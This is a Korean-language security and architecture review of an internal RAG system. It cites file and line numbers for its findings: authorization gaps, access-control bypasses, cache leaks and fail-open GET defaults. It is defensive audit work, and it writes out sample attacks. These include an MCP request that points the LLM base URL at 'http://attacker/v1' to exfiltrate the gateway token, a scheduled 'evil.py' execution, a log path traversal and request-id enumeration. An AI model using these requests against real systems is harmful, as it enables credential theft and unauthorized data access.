# 코드베이스 리뷰 (2026-09-19) — 처음 보는 사람의 눈으로

> 작성 배경: 이 시스템을 **처음 보는 시니어 아키텍트**가 `llmwiki/` 전체와 `tests/`·`tools/verify/`·주요 문서를 읽고
> 쓴 리뷰다. 목적은 칭찬이 아니라 **다음 작업의 근거**를 만드는 것이다.
>
> 이 문서의 규칙 세 가지.
> 1. 모든 주장에 **파일:줄**을 붙인다. 문서만 읽고 쓴 문장은 없다.
> 2. 코드로 확인하지 못한 것은 **"확인 필요"** 라고 적는다. 지어내지 않는다.
> 3. 이미 [QA_HARDENING_0919.md](QA_HARDENING_0919.md) · [DEEP_REVIEW_0919.md](DEEP_REVIEW_0919.md) ·
>    [CODE_REVIEW_0917.md](../2026-09-17/CODE_REVIEW_0917.md) 가 다룬 것은 **다시 쓰지 않고**, 그 **다음**을 찾는다.
>    (각 항목에 "이미 아는 것과 무엇이 다른가" 를 적었다.)
>
> 관련: [ARCHITECTURE_V3.md](../2026-09-15/ARCHITECTURE_V3.md) · [CONCURRENCY.md](../../CONCURRENCY.md) · [SECURITY.md](../../SECURITY.md) · [RERUN.md](../../RERUN.md)

---

## §0. 한 장 요약

### 이 시스템의 성격

**"외부 의존성을 거의 지지 않기로 한 대가를, 설계의 정밀함으로 갚은 사내 RAG 시스템"** 이다.

FastAPI 대신 `BaseHTTPRequestHandler`(`llmwiki/web/server.py:353`), 벡터 DB 대신 SQLite FTS5 + numpy 인메모리 행렬
(`llmwiki/store.py:876`), pytest 대신 `unittest`, 스트리밍 대신 `/api/progress` 폴링 — 이 선택들은 "못 써서" 가 아니라
**폴더째 복사해서 사내망에 올린다**는 제약에서 역산된 것이고, 코드가 그 제약을 일관되게 지킨다. 약 40,000줄의
Python 과 5,000줄의 JS 가 외부 패키지 두 개(numpy, pypdf)만 요구한다.

동시에 이 시스템은 **관측 가능성에 비정상적으로 많이 투자했다**. 모든 단계가 `Profiler` 에 trace 를 남기고
(`llmwiki/profiler.py`), 단계별로 되돌아가 재실행할 수 있고(`llmwiki/rerun.py`), 규칙이 실제로 기여했는지 세고
(`llmwiki/ruleeffect.py`), 왜 못 답했는지 기록한다(`llmwiki/forensic.py`). 이것은 "RAG 는 왜 틀렸는지 모르는 것이
가장 큰 문제" 라는 인식에서 나온 설계이고, 이 프로젝트의 가장 독창적인 부분이다.

### 가장 강한 점 3가지

| # | 무엇 | 근거 |
|---|---|---|
| 1 | **단계(stage)를 1급 개념으로 만든 것** — 모든 단계가 trace 이름·토글·튜닝 키·재시작점·시간 제한을 갖고, 그 대응표가 코드 안에 레지스트리로 존재한다 | `llmwiki/architecture.py:33-100`(PHASES/STAGE_PHASE) · `llmwiki/rerun.py:258`(Resume) · `tools/verify/verify_stage_align.py` |
| 2 | **요청 격리가 실제로 배선되어 있다** — 설정 사본·튜닝 오버레이·스레드별 DB 연결·LLM 인스턴스 서명 캐시가 한 컨텍스트 매니저로 묶인다 | `llmwiki/pipeline.py:184-233`(`request_scope`) · `llmwiki/store.py:208-253`(`session`) · `llmwiki/tuning.py:383-393`(오버레이) |
| 3 | **실패를 숨기지 않는 규율** — LLM 이 실패해도 결과는 나오고(`ROLE_FALLBACK`), 무엇이 실패했고 무엇으로 대체했는지 답변 상단과 `llm_report` 에 남는다. 거절은 정직한 429/503 + `Retry-After` 다 | `llmwiki/query_engine.py:31-49` · `llmwiki/query_engine.py:481-487` · `llmwiki/reqmgr.py:212-223` |

### 가장 걱정되는 점 3가지

| # | 무엇 | 한 줄 요약 |
|---|---|---|
| 1 | **"막았다"고 문서가 선언한 보호가 한쪽 문에만 걸려 있다** | 같은 모양의 결함이 **세 번 반복**된다. (a) `overrides` 화이트리스트가 Web 에만 있고 **MCP 에는 없어** `.env` 의 PAT 를 공격자 URL 로 보낼 수 있다(§2.1, 재발). (b) `actor`(문서 접근 제어)가 질의 3경로에만 꿰여 **다섯 경로가 admin 으로 돈다**(§2.3). (c) `/api/cli` 가 CLI 등급 표의 fallback(`edit`=class2)을 믿는데 `schedule` 이 거기 빠져, **class2 가 임의 명령 실행**에 이른다(§2.2) |
| 2 | **GET 요청이 인가 기본값도 용량 제어도 fail-open 이다** | `classify_api` 의 GET 기본값은 `read`(=익명 viewer)다 — 목록(`auth.py:359`)에 손으로 안 적으면 **새 GET 엔드포인트는 자동으로 전체 공개**된다. 동시에 GET 은 티켓을 받지 않아 속도 제한·동시 수·대기열을 전부 건너뛴다(`server.py:628-630`). `CONCURRENCY.md §3` 의 흐름도가 **사실과 다르다** (§2.4, §2.7, §5.1) |
| 3 | **"이 기능은 배선됐나"를 검증하는 장치가 없다** | 이 저장소의 실패 패턴은 늘 같다 — 설정만 있고 배선이 없거나(QA 1-B), 한 출구만 막았거나(QA 4-B), 인자를 조용히 버린다. 그런데 `verify_surface_align.py` 는 **이름의 존재**만 보고, `test_doc_acl.py:199` 는 **테스트가 직접 `actor` 를 주입**해 배선을 건너뛴다. 즉 §2.1~2.3 을 고쳐도 **다음에 또 같은 모양으로 깨진다** (§4.1) |

> 정직하게 덧붙이면: 걱정 1의 (b)는 **`docacl.json` 에 규칙을 넣은 뒤에만** 실재한다(기본은 규칙 0개 = 아무도 안 막음).
> 그러나 (a)는 **기본 구성에서 지금 당장** 성립하고, `anonymous_role` 이 설정돼 있으면 **로그인 없이** 성립한다.
> 그리고 세 건 모두 `SECURITY.md`·`QA_HARDENING_0919.md`·`CODE_REVIEW_0917.md` 가 "막았다"고 선언한 것들이다.
> **믿음과 코드가 어긋난 것이 결함의 본질**이다.

---

## §1. 아키텍처 강점 — 왜 이 선택이 좋았나

### 1.1 단계 레지스트리: "토글이 있는데 어디에 붙는지 모르겠다" 를 구조로 없앴다

대부분의 RAG 시스템에서 설정은 **평평한 딕셔너리**다. `rerank_candidates` 를 바꾸면 무엇이 달라지는지 알려면 코드를 읽어야 한다.

이 프로젝트는 `architecture.py` 에 흐름 → 페이즈 → 단계 → trace 노드의 4단 레지스트리를 두고
(`llmwiki/architecture.py:25-29`의 `_s()` 가 단계 하나의 스키마), 단계마다 `toggles`·`tunables`·`settings`·`cli`·`trace`·`impact` 를 붙였다.
그 결과:

- Web 🧭 Pipeline 화면과 CLI `arch` 가 **같은 정의**를 읽는다 (파일 상단 docstring).
- 튜닝 키는 `tuning.py` 의 `STAGES` 에서 **자동 수집**되므로, 키를 추가하면 화면에 저절로 나타난다.
- 단계를 새로 넣고 `STAGE_PHASE`(`architecture.py:62`)에 등록하지 않으면 `tests/test_tuning_arch.py` 가 잡는다 —
  주석(`architecture.py:60-61`)에 그 계약이 적혀 있다.

이것이 왜 좋은가: **설정의 수가 문제가 아니라 설정과 동작의 연결이 문제**다. 토글 56개·튜닝 130+개는
평평했다면 관리 불가능했을 텐데, 단계에 묶여 있어서 "이 단계가 느리다 → 이 키들을 본다" 가 된다.
`analysis.py`(렌즈)와 `sweep.py`(값별 재실행)가 그 위에 얹힌 것도 이 레지스트리 덕분이다.

### 1.2 요청 격리: 전역 락을 없애기 전에 "무엇이 공유돼서 위험한가" 를 먼저 갈랐다

`CONCURRENCY.md §1` 이 설명하는 순서가 옳다. 락을 없애는 것이 아니라 **락이 막고 있던 세 가지 공유**(DB 연결, 전역 Settings,
전역 프로파일 카운터)를 먼저 분리했다. 코드가 그대로다:

- `Pipeline.s` 가 **프로퍼티**다 (`llmwiki/pipeline.py:138-148`). `request_scope` 안에서는 스레드 로컬 사본, 밖에서는 전역.
  함수 시그니처를 줄줄이 바꾸지 않고 격리를 얻은 영리한 선택이다.
- `Store.session()` (`llmwiki/store.py:208-253`)이 중첩을 허용하고(`if getattr(self._tl,"conn",None) is not None: yield self`),
  끝날 때 미커밋 트랜잭션을 롤백한다. 반납 실패 경로(generation 불일치 → `close()`)까지 처리한다.
- LLM 인스턴스를 **(역할, provider, model, 정책) 서명**으로 캐시한다 (`pipeline.py:241-265`). 그래서 A 가 `--llm ollama` 로,
  B 가 게이트웨이로 동시에 질의해도 서로 덮어쓰지 않는다. 캐시 상한 64·LRU-ish 퇴출까지 있다(`pipeline.py:261-264`).

`request_scope` 의 `finally`(`pipeline.py:229-233`)가 오버레이·설정·actor 를 모두 되돌리는 것도 정확하다.
중첩 시 **바깥 사본을 바탕으로 다시 사본**을 만드는 것(`pipeline.py:196`)이 핵심이다 — 그래서 Web 핸들러의 바깥
`request_scope()`(`web/server.py:1211`) 안에서 `/api/query` 가 다시 열어도(`server.py:2087`) 값이 누적되지 않는다.

### 1.3 "품질을 깎는 방향으로는 실패하지 않는다" 를 규칙으로 만든 것

여러 자리에서 같은 원칙이 반복된다. 이것이 우연이 아니라 의식적 규칙임은 주석이 증명한다.

| 자리 | 규칙 |
|---|---|
| `query_engine.py:751-754` | 융합/리랭크 뒤 LLM 이 실패하면 **순위를 그대로 둔다** ("품질을 깎는 방향으로는 실패하지 않는다") |
| `query_engine.py:790-794` | LLM 이 후보를 **전부** drop 하라고 하면 무시한다 (근거가 사라지면 답을 못 만든다) |
| `query_engine.py:691-694` | 압축 결과가 인용을 잃었거나 더 짧지 않으면 **원본 유지** |
| `ctxguard.py:30-33` | 인젝션 방어는 본문을 **지우지 않고 표시만 바꾼다** ("보안을 이유로 근거를 없애면 답이 나빠진다") |
| `answer.py:262-277` | 컨텍스트 상한에 걸려도 `break` 하지 않고, 남은 자리가 쓸 만하면 **잘라서 넣고** 다음 후보를 계속 본다 |
| `store.py:1102-1110` | 관측 기록(`log_request`)이 실패해도 **질의를 죽이지 않는다** |

이 규칙은 운영에서 크다. RAG 의 부가 기능(검증·압축·리랭크·인젝션 방어)은 전부 **주 기능을 망칠 수 있는** 위치에 있는데,
여기서는 모두 "실패 시 무해" 로 수렴한다.

### 1.4 설정의 외부화가 립서비스가 아니다

`tuning.py:464-478`의 `save_tuning(explicit=…)` 과 `fill_defaults()`(`:481`)는 "기본값과 같은 값도 파일에 명시적으로
남긴다" 를 실제로 구현한 것이다. `tuning.json` 에 `_explicit_defaults: true` 표식이 실제로 있고(148줄, 전 키 기록),
표식이 있으면 이후 모든 저장이 전 키를 유지한다. 이것이 없으면 `Tuning.set()`(`tuning.py:401-411`)이
기본값과 같은 값을 `values` 에서 **pop 해 버리므로**, Web UI 에서 값을 기본값으로 되돌리는 순간 그 줄이 파일에서 사라진다.
그 함정을 알고 막아 둔 것이다.

`setup/` 에 `config.example.pat-gateway.json` · `config.example.headless.json` · `docacl.example.json` 등
예시 파일이 실제로 존재하는 것도 확인했다.

### 1.5 원자적 저장이 Windows 를 실제로 고려했다

`atomicio.py` 의 docstring(1-22줄)이 이 파일이 왜 있는지 정확히 설명한다 — 고정된 `.tmp` 이름의 두 가지 실패 모양,
그리고 Windows 에서 `os.replace` 가 `WinError 5/32` 로 실패하는 현실. 해법도 정확하다: pid+tid+난수 임시 이름(`:58-60`),
경로별 락(`:49-55`), 지수 백오프 재시도(`:104-117`), `fsync`(`:99`). 이 정도로 정교한 원자적 저장은 드물다.
(단, 그 경로별 락 딕셔너리에 누수가 있다 — §2.9.)

---

## §2. 약점과 위험

각 항목: **심각도** / **구체적 실패 시나리오** / **파일:줄** / (추측이면 명시).

---

### 2.1 🔴 높음 — MCP 경로가 `overrides` 화이트리스트를 타지 않는다 (`.env` 의 PAT 유출)

**이것은 이미 한 번 고쳤다고 선언된 결함이 다른 문으로 남아 있는 경우다.**

`web/server.py:236-240` 의 주석이 그 역사를 적고 있다.

> 왜 있나: `apply_overrides` 는 Settings 의 **모든** 필드를 받아들인다. 그래서 예전에는 읽기 등급(익명 포함)이
> `/api/query` 에 `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보내면 서버가 .env 의 PAT 를 그 주소로
> 보냈고 … (CODE_REVIEW_0917 §0 P0-1)

Web 경로는 실제로 막혔다 — `_filter_overrides`(`web/server.py:254-290`)가 `_dispatch_post` 진입부(`:1561`)와
sweep 의 두 자리(`:1603`, `:1607`)에서 불린다.

**그런데 MCP 경로에는 그 호출이 없다.**

```
llmwiki/mcp.py:502-517
    def _query_with(pipe, question, k, mode, doc_types, preset, overrides=None, output_mode=None):
        ov: Dict[str, Any] = dict(overrides or {})      ← 도구 인자를 그대로
        …
        with pipe.request_scope(overrides=ov or None, presets=names, mode=mode or ""):
            res, tr = pipe.query(question, log=True)
```

`web/server.py:529-574` 의 `_mcp()` 핸들러도 `_filter_overrides` 를 부르지 않는다
(`actor` 는 넘기지만 `:573`, overrides 는 검사하지 않는다).

#### 공격이 성립하는 이유 (코드로 확인)

1. `/mcp` 의 권한 등급은 **read** 다 (`auth.py:342` 의 `_READ_POST` 에 `"/mcp"` 포함).
   `anonymous_role` 이 설정돼 있으면 **로그인 없이** 도달한다.
2. `request_scope(overrides=ov)` → `apply_overrides(s_local, …)`(`pipeline.py:206`) → `Settings.openai_base_url` 이 바뀐다.
3. `openai_base_url` 은 **LLM 인스턴스 서명에 포함**된다 (`pipeline.py:92-95` `PROVIDER_SIG_KEYS`).
   따라서 `llm_for("answer")` 가 **새 URL 로 새 인스턴스를 만든다** (`pipeline.py:254-265`).
4. `make_llm` → `OpenAICompatLLM(settings.openai_base_url, …)` (`providers.py:1151`),
   키는 `openai_api_key()` = `OPENAI_API_KEY` 또는 `LLM_API_KEY` (`providers.py:662-666`),
   헤더는 `auth_headers(self.api_key, self.key_header, …)` (`providers.py:739`).

즉 **서버가 사내 게이트웨이 PAT 를 공격자가 지정한 URL 로 `Authorization: Bearer …` 에 실어 보낸다.**

```
POST /mcp
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"wiki_query",
 "arguments":{"question":"x","overrides":{"openai_base_url":"http://attacker/v1"}}}}
```

`overrides` 를 받는 다른 MCP 도구도 같다 — `wiki_rerun`(`mcp.py:868`)·`wiki_sweep` 계열이
`pipe.request_scope(overrides=ov or None)` 를 필터 없이 연다.

#### 왜 아무도 못 봤나

`tests/test_overrides_guard.py`(7항목)는 `_filter_overrides` 를 **`/api/query` 경로로만** 시험한다
(`:95` 가 HTTP 왕복). "같은 보호가 다른 창구에도 걸려 있는가" 라는 질문이 없다 —
`verify_surface_align.py` 가 보는 것은 **기능의 존재**이지 **보호의 존재**가 아니기 때문이다.

#### 조치 (P0)

`mcp.py` 의 모든 `overrides` 수용 지점에서 `_filter_overrides(ov, role)` 를 부른다.
더 나은 해법은 **필터를 `Pipeline.request_scope` 안으로 옮기는 것** — `actor` 가 이미 거기 있으므로,
"신분과 그 신분이 바꿀 수 있는 설정" 을 한 자리에서 판정하면 문이 몇 개든 새지 않는다.

> **확인 필요**: 실제 아웃바운드 요청을 관측해 실증하지는 않았다. 위 4단계는 모두 코드로 확인했으나,
> 배포 전에 `POST /mcp` 로 임의 `base_url` 을 지정하고 그 주소에서 헤더를 받아 보는 실증을 권한다.

---

### 2.2 🔴 높음 — `/api/cli` 가 CLI 등급표의 fallback 을 믿는데, `schedule` 이 그 fallback 에 빠진다 (class2 → 임의 실행)

#### 사슬

```
auth.py:334          classify_cli 의 마지막 줄:  return "edit", "cli:%s" % cmd     ← 표에 없는 명령
auth.py:377-387      /api/cli 는 그 결과를 쓰고 하한만 run 으로 올린다
web/server.py:1845   run_captured(argv, p.s, p, actor=…)
cli.py:2825,2832     """권한은 서버(/api/cli)가 이미 판정했으므로 CLI 게이트를 타지 않는다"""
                     code = run(argv, settings, pipe, gate=False)      ← _cli_gate 우회
```

`_READ_CLI`(`auth.py:262-265`)·`_EDIT_CLI`(`:276`)·`_INDEX_CLI`(`:279`)·`_REBUILD_CLI`(`:261`)·
`_DESTRUCTIVE_CLI`(`:260`) 어디에도 **`schedule` 이 없다**. (`server`·`optimize`·`inspect`·`rerun` 도 같다.)
따라서 `classify_cli(["schedule", …])` → `("edit", "cli:schedule")` → **class2 이상이면 통과**.

한편 같은 일을 하는 직접 경로 `POST /api/schedule` 은 **admin** 이다 (`auth.py:350`, 핸들러 `server.py:1505`).
즉 **콘솔이 admin 게이트를 우회하는 뒷문**이 된다.

#### 실패 시나리오

```
class2 계정으로:
  POST /api/cli {"argv": "schedule add --task
     {\"name\":\"x\",\"when\":{\"every\":\"1h\"},
      \"action\":{\"type\":\"python\",\"script\":\"tools/evil.py\"}}"}
→ classify_cli("schedule") = ("edit", …) → 통과
→ cli.py:2742 _sc.upsert_task(t)  → schedule.json 에 저장
→ 스케줄러가 서버 프로세스 권한으로 실행 (scheduler.py:34 ACTION_TYPES 에 "python" 존재)
```

`ACTION_TYPES`(`scheduler.py:34-35`)에는 `python`(별도 프로세스로 임의 스크립트),
`cli`(설명문 자체가 "**모든 CLI 기능**을 쓸 수 있다 … 파괴적 명령은 `--yes` 필요" — 공격자는 `--yes` 를 직접 넣는다,
`scheduler.py:40`), `http`(SSRF), `fetch_url`(코퍼스 폴더에 파일 쓰기)이 있다.
즉 **class2 → destructive·admin 전 등급 우회 + 서버 프로세스 권한 임의 실행**이다.

`scheduler.py:765 run_now()` 가 있으므로 예약 주기를 기다릴 필요도 없다.

#### 구조적 원인

`classify_cli` 의 fallback 방향은 옳다(모르면 `edit`, fail-closed 쪽). 문제는 **`edit` 이 충분히 높지 않다**는 것이다.
`schedule`·`server` 는 그 자체로 admin 급 작업인데 "모르는 명령" 으로 취급됐다.

#### 조치 (P0)

1. `classify_cli` 의 fallback 을 `edit` → **`admin`** 으로 올린다. 모르는 CLI 명령을 class2 에게 주는 것은
   "자유 명령 입력창" 을 주는 것과 같다 (`auth.py:386` 주석이 스스로 그 위험을 인정하면서 하한을 `run` 으로만 올렸다).
2. `schedule`·`server`·`optimize`·`inspect`·`rerun` 을 표에 **명시적으로** 넣는다.
3. `tests/` 에 "`cli.py` 의 모든 서브커맨드가 `classify_cli` 표에 **명시적으로** 존재한다" 는 단언을 추가한다 —
   `build_parser`(`cli.py:58`)에서 서브커맨드 목록을 뽑아 대조하면 된다. 새 명령이 늘 때 자동으로 잡힌다.

---

### 2.3 🔴 높음 — 문서 접근 제어(docacl)가 질의를 실행하는 다섯 경로에서 우회된다

#### 구조

`Pipeline.actor` 의 기본값은 **admin** 이다.

```
llmwiki/pipeline.py:161-163
    @property
    def actor(self) -> Dict[str, str]:
        return getattr(self._tls, "actor", None) or {"user": "", "role": "admin", "origin": ""}
```

`acl_filter()`(`pipeline.py:169-174`)는 이 역할로 `docacl.Filter` 를 만들고, `Filter.enabled`(`docacl.py:163-164`)는
`role != "admin"` 일 때만 True 다. 즉 **actor 를 넘기지 않으면 접근 제어가 통째로 꺼진다.**

2026-09-19 작업은 `actor` 를 세 곳에 꿰었다.

| 경로 | actor | 파일:줄 |
|---|---|---|
| `POST /api/query` | ✔ | `web/server.py:1645` |
| `POST /api/debug/query` | ✔ | `web/server.py:1674` |
| `POST /api/search` | ✔ | `web/server.py:1685` |
| `POST /mcp` (전 도구) | ✔ | `web/server.py:573` |

그런데 **질의를 실행하는 나머지 경로는 빠졌다.**

| 경로 | actor | 파일:줄 | 권한 등급 |
|---|---|---|---|
| `POST /api/cli` → `run_captured` → `cli.run` | ✘ | `web/server.py:1845` → `cli.py:2832` → `cli.py:816` | `query` 는 `_READ_CLI` (`auth.py:262`) → **read** |
| `POST /api/query/rerun` | ✘ | `web/server.py:1631` | `_READ_POST` (`auth.py:337`) → **read** |
| `POST /api/sweep` | ✘ | `web/server.py:1616` → `server.py:2119` | `_READ_POST` (`auth.py:338`) → **read** |
| `POST /api/eval` | ✘ | `web/server.py:1578` → `server.py:2119` | 확인 필요 (등급 표 미확인) |
| 모든 백그라운드 잡(`_start_job`) | ✘ | `web/server.py:2119` `with pipe.request_scope():` | 잡별 |

#### 실패 시나리오 (재현 가능한 형태)

전제: `docacl.json` 에 `{"prefix": "corpus/hr/", "min_role": "class1"}` 이 있고, `viewer` 로 로그인했다
(= `QA_HARDENING_0919.md` TC-4.1/4.2 의 바로 그 설정).

```
1. viewer 로 Ask 에서 질문 → doc_acl 단계가 걸러 근거에 인사 문서가 없다.  (TC-4.2 통과)
2. 같은 viewer 가:
     POST /api/cli  {"argv": "query \"인사 평가 등급 기준\" --json"}
   → classify_cli("query") = ("read", ...) → viewer 통과
   → run_captured → cli.run(gate=False) → pipe.request_scope(overrides, presets)   ← actor 없음
   → pipe.actor = {"role": "admin"} → Filter.enabled = False
   → **인사 문서 전문이 근거와 답변에 그대로 들어온다.**
```

같은 결과를 내는 다른 두 경로:

- `POST /api/sweep {"query":"인사 평가 등급 기준","key":"top_k_final","range":"3..5"}` →
  `_start_job(..., weight="read")` → 잡 스레드가 `pipe.request_scope()`(actor 없음)로 질의를 **여러 번** 실행.
  결과는 `job.result.record` 에 답변·컨텍스트째로 들어간다.
- `POST /api/query/rerun {"request_id": <아무 id>, "from": "answer_llm"}` → 아래 2.2 와 겹쳐 두 겹으로 뚫린다.

#### 왜 테스트가 못 잡았나

`tests/test_doc_acl.py`(24항목)는 `QA_HARDENING_0919.md §4` 가 정의한 **네 출구**(질의 근거·채널 검색·문서 열람·MCP)만 본다.
"질의를 실행하는 다른 진입점" 이라는 축이 애초에 목록에 없다.

#### 조치

`request_scope(actor=…)` 를 위 다섯 경로에 넘긴다. 근본 해법은 **actor 를 옵션이 아니라 기본 거부로 바꾸는 것**이다 —
`Pipeline.actor` 의 기본값을 `admin` 에서 `viewer` 로 바꾸고, CLI 단독 실행 경로에서만 명시적으로 admin 을 올린다.
지금 구조는 "잊으면 열린다"(fail-open)이고, 접근 제어는 "잊으면 닫혀야" 한다.

---

### 2.4 🔴 높음 — 단계 재실행(rerun) 재생 경로에 접근 제어가 아예 없고, 남의 request_id 를 제한 없이 재생할 수 있다

#### 두 겹의 문제

**(a) 재생 경로에 doc_acl 단계가 없다.**

정상 검색 경로에는 `doc_acl` 단계가 있다 (`query_engine.py:1170-1198`, 부스트 뒤·리랭크 앞).
그러나 재실행이 검색을 **재생**할 때 쓰는 `_replay_retrieval`(`query_engine.py:606-647`)에는 그 단계가 없다.
저장해 둔 `final` hits 와 `ctx` 를 그대로 쓰고, 빠진 청크 본문은 `store.get_chunks(want)`(`:621`)로 **색인에서 직접** 읽는다.
즉 actor 가 올바르게 넘어와도(MCP `wiki_rerun` 경로) 재생 시에는 걸러지지 않는다.

그리고 저장본에는 **컨텍스트 본문이 통째로 들어 있다** — `self.capture.put("ctx", ctx)`(`query_engine.py:1337-1338`),
`ctx["text"]` 는 근거 전문이다. `rerun_capture` 토글은 **기본 켜짐**(`config.py:244`)이고 파일은
`data/reruns/req_<id>.json` 에 최근 50건 남는다(`config.py:355-356`).

**(b) 소유자 확인이 없다.**

`/api/request` 는 남의 요청을 막는다:

```
web/server.py:917-919
    if (r and r.get("user") and user and auth and auth.mode != "off" and r["user"] != user.name
            and not auth.allowed(user.role, "run", "requests all")):
        return self._json({"error": "다른 사용자의 요청입니다 ..."}, 403)
```

같은 검사가 rerun 쪽에는 **없다**:

- `GET /api/rerun?request_id=N` (`web/server.py:782-793`) → 남의 질의 **원문**(`of.query`, `:792`)을 그대로 돌려준다.
- `POST /api/query/rerun {"request_id": N, "from": "answer_llm"}` (`web/server.py:1617-1637`) →
  `p.rerun(rid, point)` → `_rerun.load(self.s, request_id)`(`pipeline.py:1418`) — **아무 검사 없이 파일을 연다.**

#### 실패 시나리오

```
viewer 계정으로:
  for rid in range(1, 500):
      POST /api/query/rerun {"request_id": rid, "from": "verify"}
→ 저장된 중간 결과가 있는 최근 50건에 대해,
  · 그 질문이 무엇이었고
  · 어떤 문서가 근거로 들어갔고 (ctx.text = 문서 본문)
  · 무엇이라고 답했는지
  를 전부 받는다. doc_acl 은 (a) 때문에 재생 경로에서 실행되지 않고,
  actor 도 (2.1) 때문에 admin 이다.
```

request_id 는 순차 정수(`store.py:1134` `cur.lastrowid`)라 추측이 아니라 **열거**다.

#### 조치

1. `_replay_retrieval` 에 `doc_acl` 을 넣는다 — 재생한 `final`·`ctx.citations` 를 `acl_filter().filter_hits` 로 거르고,
   걸러진 근거가 있으면 trace 에 남긴다(조용히 줄면 원인을 알 수 없다는 이 파일 자신의 주석 `:609-610` 과 같은 이유다).
2. `/api/rerun`(GET)·`/api/query/rerun`(POST)·`/api/sweep` 에 `/api/request` 와 **같은 소유자 검사**를 붙인다.
3. `data/reruns/*.json` 에 요청자(user)를 함께 저장해 검사할 근거를 만든다 (`rerun.py:180-202` 의 `Capture`).

---

### 2.5 🔴 높음 — 질의 캐시와 사전계산 캐시의 키에 역할이 없다 (캐시를 켜는 순간 접근 제어가 무의미해진다)

```
llmwiki/pipeline.py:1374-1382   _cache_key(q)
    sig = {"q":…, "toggles":…, "k":…, "ctx":…, "llm":…, "emb":…, "v": build_version,
           "syn":…, "tuning":…, "day":…}        ← 역할/사용자 없음
llmwiki/precompute.py:28-30     cache_key(q, build_version, sig)
    raw = json.dumps({"q": _norm_q(q), "v": build_version, "sig": sig})   ← 역할/사용자 없음
```

`_qcache` 는 `Pipeline` 인스턴스 하나에 붙어 있고(`pipeline.py:130`), 그 인스턴스는 **서버 전체가 공유**한다
(`Handler.pipe`, `web/server.py:2201`). `answer_cache` 테이블은 그보다 나빠서 **재시작을 넘어 영속**한다.

그리고 캐시 적중 시 `doc_acl` 단계는 **실행조차 되지 않는다** — `_retrieve` 에 들어가기 전에 반환하기 때문이다
(`query_engine.py:176-196`).

#### 실패 시나리오

```
1. class1 인 김과장이 "인사 평가 등급 기준" 을 묻는다 → corpus/hr/ 문서를 근거로 정상 답변.
2. 그 결과가 p.qcache_put(key, …) 로 들어간다 (query_engine.py:595-596).
3. viewer 인 인턴이 **같은 문장**을 묻는다.
   → _cache_key 가 같다 (질문·토글·튜닝·빌드버전이 같으므로)
   → qcache_get 적중 → dict(cached["result"], cached=True, …) 를 그대로 반환
   → answer · refs · hits 전부 그대로. 인사 문서 본문이 인턴 화면에 뜬다.
```

`precompute` 는 더 나쁘다. `precompute.run()`(`precompute.py:101-137`)은 **평가셋 + 최근 질의 로그 상위 N개**를
미리 실행해 저장하는데, 그 실행은 백그라운드 잡(§2.3)이므로 **admin 권한**으로 돈다. 즉
"모든 등급의 문서를 근거로 만든 답변" 을 미리 만들어 `answer_cache` 에 넣고, 이후 **누가 물어도** 그것을 돌려준다.

#### 완화 요인 (정직하게)

`query_cache` 와 `precompute` 토글은 **기본 off** 다 (`config.py:220`, `config.py:237`, `config.json:567,583`).
그래서 지금 당장 터지지는 않는다. 그러나 이 둘은 30명 환경에서 **토큰 비용을 줄이려고 가장 먼저 켜는 손잡이**이고,
`BRINGUP_GUIDE`·`OPTIMIZATION_GUIDE` 가 권하는 항목이다. "켜면 접근 제어가 무너진다" 는 어디에도 적혀 있지 않다.

#### 조치

`_cache_key`/`answer_signature` 에 **가시 문서 집합의 지문**을 넣는다. 사용자 id 를 넣으면 캐시 적중률이 0에 수렴하므로,
`docacl` 규칙 + 역할로부터 유도되는 **등급 하나**를 넣는 것이 맞다 (같은 등급끼리는 같은 문서를 보므로 캐시를 공유해도 안전하다).
예: `sig["acl"] = (acl_rules_mtime, effective_role)`. 최소한, 토글을 켤 때 경고를 띄우고 `SECURITY.md` 에 적어야 한다.

---

### 2.6 🟠 중간 — GET 의 인가 기본값이 fail-open 이고, 그 결과 민감한 조회 경로가 익명에 열려 있다

`classify_api`(`auth.py:354-431`)의 두 기본값은 방향이 반대다.

```
auth.py:359   GET  path in {/api/auth/users, /api/audit, /api/security, /api/apikeys,
                             /api/admin/server, /api/env, /api/docacl}  → ("admin", path)
auth.py:361   GET  그 밖의 전부                                           → ("read", path)   ← fail-OPEN
auth.py:431   POST 아무 세트에도 안 걸리면                                 → ("edit", path)   ← fail-CLOSED
```

POST 쪽은 옳다(모르면 class2). GET 쪽은 **새 엔드포인트를 만들 때 `auth.py:359` 목록에 손으로 적지 않으면
자동으로 전체 공개**된다. `anonymous_role` 이 `viewer` 면 로그인조차 필요 없다.

`SECURITY.md §2.2` 가 "GET 전부(admin 전용 조회 제외)" 라고 적어 이 설계를 **인정**하고는 있으므로
엄밀히는 DRIFT 가 아니라 **설계 약점**이다. 그러나 그 약점이 실제로 무엇을 열어 두었는지는 어디에도 없다.

| 경로 | 핸들러 | 익명(viewer)에게 무엇이 새나 |
|---|---|---|
| `GET /api/logs?file=` | `web/server.py:1067-1086` | **경로 순회.** `os.path.join(d, (qs.get("file") or "llmwiki") + ".log")` — `file` 값 검증이 없다. `?file=../../../../Users/user/secret` → `secret.log` 를 읽는다. 확장자 `.log` 만 강제된다 |
| `GET /api/logs/files` | `:1063-1066` | 로그 디렉터리 목록과 **절대 경로** |
| `GET /api/query_trace?id=` | `:888-890` | **소유자 검사 없음.** 임의 질의의 trace 전문 = 검색된 문서 본문·컨텍스트. 바로 옆 `/api/request`(`:915-919`)에는 검사가 있다 → **docacl 의 다섯 번째 출구** |
| `GET /api/schedule` | `:724-736` | `schedule.json` 전체 — `http` 액션의 webhook URL·헤더, `python` 액션의 스크립트 경로, 프롬프트. **POST 는 admin 인데 GET 은 익명** |
| `GET /api/config/effective` | `:1045-1046` | `Settings` 전 필드를 마스킹 없이 (`config.py:749-762`) — `openai_base_url`·`corpus_dirs`·`data_dir` 등 내부 토폴로지. (실 키는 `.env` 에 있고 Settings 필드가 아니라 키 자체는 안 샌다) |
| `POST /api/forensic/llm` · `POST /api/analysis/insight` | `auth.py:342`(read), 핸들러 `:2050`·`:2060` | **LLM 을 실제로 호출한다.** `SECURITY.md §2.2` 가 정의한 `run`("토큰·시간 소모 실행")에 정면으로 어긋난다. 익명이 토큰을 태울 수 있다 |

저자도 이 위험을 알고 있다 — `/api/query_users`(`:885-886`)와 `/api/admin/server`(`:714-716`)에는
핸들러 **안에** `role != "admin"` 하드 가드를 따로 넣었다. 즉 **분류표가 아니라 개별 땜질**로 막았고,
그래서 일관성이 없다.

